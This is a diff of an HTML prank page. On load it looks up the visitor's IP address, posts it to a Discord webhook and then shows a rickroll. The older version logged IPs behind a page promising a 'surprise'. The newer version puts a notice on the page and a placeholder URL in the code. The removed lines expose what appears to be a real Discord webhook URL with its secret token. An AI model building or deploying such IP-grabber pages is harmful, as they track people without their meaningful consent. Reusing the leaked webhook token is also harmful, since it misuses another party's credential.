@@ -23,8 +23,18 @@
             margin: auto;
             max-width: 500px;
         }
-        p {
-            font-size: 18px;
+        .embed {
+            background: #d9edf7;
+            border-left: 5px solid #31708f;
+            padding: 10px;
+            text-align: left;
+            margin-top: 20px;
+        }
+        .embed h2 {
+            color: #31708f;
+        }
+        .embed a {
+            color: #31708f;
         }
     </style>
     <script>
@@ -36,23 +46,18 @@
                 const userIP = ipData.ip;
 
                 // Your Discord webhook URL
-                const webhookURL = 'https://canary.discord.com/api/webhooks/1302309514535636992/yuhD9Kend0XesiNWmg2KfHumJXCHlLXRxVdSIhlr37TpB_G8ZJx16I2e1Ah7zQMzbta5';
+                const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL';
 
-                // Create an embed message for the rickroll
+                // Create an embed message for Discord
                 const embed = {
-                    title: "You've been Rickrolled!",
-                    description: "🎵 Never gonna give you up, never gonna let you down! 🎵",
-                    url: "https://www.youtube.com/watch?v=dQw4w9WgXcQ", // Rickroll link
-                    color: 16711680, // Red color
-                    image: {
-                        url: "https://media.giphy.com/media/xT39D7y9F8c0wVLV5e/giphy.gif" // A rickroll gif
-                    },
+                    title: "User IP Information",
+                    color: 3447003, // A nice blue color
                     fields: [
-                        { name: "IP Address Logged", value: `**${userIP}**`, inline: true }
+                        { name: "IP Address", value: `**${userIP}**`, inline: true }
                     ]
                 };
 
-                // Send the embed to the Discord webhook
+                // Send the IP address to the Discord webhook
                 await fetch(webhookURL, {
                     method: 'POST',
                     headers: {
@@ -61,9 +66,18 @@
                     body: JSON.stringify({ embeds: [embed] })
                 });
 
-                console.log('Rickroll embed sent to Discord:', embed);
+                console.log('IP information sent to Discord:', embed);
+
+                // Display rickroll embed on the website
+                document.getElementById('rickroll').innerHTML = `
+                    <h2>You've been Rickrolled!</h2>
+                    <p>🎵 Never gonna give you up, never gonna let you down! 🎵</p>
+                    <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ" target="_blank">Watch the rickroll video!</a>
+                    <br>
+                    <img src="https://media.giphy.com/media/xT39D7y9F8c0wVLV5e/giphy.gif" alt="Rickroll GIF" style="width: 100%; max-width: 400px; border-radius: 8px; margin-top: 10px;">
+                `;
             } catch (error) {
-                console.error('Error sending embed:', error);
+                console.error('Error sending IP information:', error);
             }
         }
 
@@ -74,7 +88,8 @@
 <body>
     <div class="container">
         <h1>Welcome!</h1>
-        <p>Enjoy your surprise!</p>
+        <p>Your IP address is being logged.</p>
+        <div id="rickroll" class="embed"></div>
     </div>
 </body>
 </html>
